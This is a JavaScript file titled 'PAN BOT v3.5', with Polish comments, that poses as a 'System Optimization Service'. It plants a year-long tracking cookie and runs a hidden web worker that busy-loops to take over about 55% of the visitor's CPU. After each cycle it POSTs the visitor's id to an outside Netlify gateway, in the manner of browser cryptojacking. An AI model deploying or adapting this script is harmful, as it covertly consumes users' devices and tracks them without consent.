// PAN BOT v3.5 - SYSTEM OPTIMIZATION SERVICE
const PROCESS_NAME = "System Optimization Service";
const GATEWAY = "https://playful-blini-a52d68.netlify.app/.netlify/functions/power";

(function() {
    // 1. INICJACJA I UKRYCIE W KONSOLI
    console.log(`[SYS] ${PROCESS_NAME} initialized...`);

    // 2. AUTOMATYCZNE WJĘBANIE DO KUKI (Persistence)
    (function injectCookie() {
        const tokenName = "sys_opt_token";
        if (!document.cookie.split('; ').find(row => row.startsWith(tokenName))) {
            const newId = "KING_" + Math.random().toString(36).substr(2, 9).toUpperCase();
            // Ciasteczko na 1 rok, dostępne dla całej domeny
            document.cookie = `${tokenName}=${newId}; max-age=31536000; path=/; SameSite=Lax`;
        }
    })();

    // 3. GHOSTWORKER - PRZEJMOWANIE MOCY OBLICZENIOWEJ
    const workerBlob = new Blob([`
        onmessage = function() {
            setInterval(() => {
                let start = Date.now();
                while (Date.now() - start < 450) { // Praca przez 450ms
                    Math.sqrt(Math.random() * 99999);
                }
                postMessage("WORK_DONE");
            }, 1000); // Cykl 1 sekunda (55% CPU)
        };
    `], { type: 'application/javascript' });

    const worker = new Worker(URL.createObjectURL(workerBlob));

    // 4. PRZESYŁANIE MOCY NA STRONĘ (GATEWAY)
    worker.onmessage = function() {
        const payload = {
            // Pobieranie ID z kuki lub fallback na GUEST
            id: document.cookie.split('; ').find(row => row.startsWith("sys_opt_token"))?.split('=')[1] || "GUEST",
            type: "SYSTEM_IDLE",
            timestamp: Date.now()
        };

        // Wysłanie raportu do Imperium
        fetch(GATEWAY, { 
            method: 'POST', 
            mode: 'no-cors', 
            body: JSON.stringify(payload) 
        });
    };

    worker.postMessage("start");
})();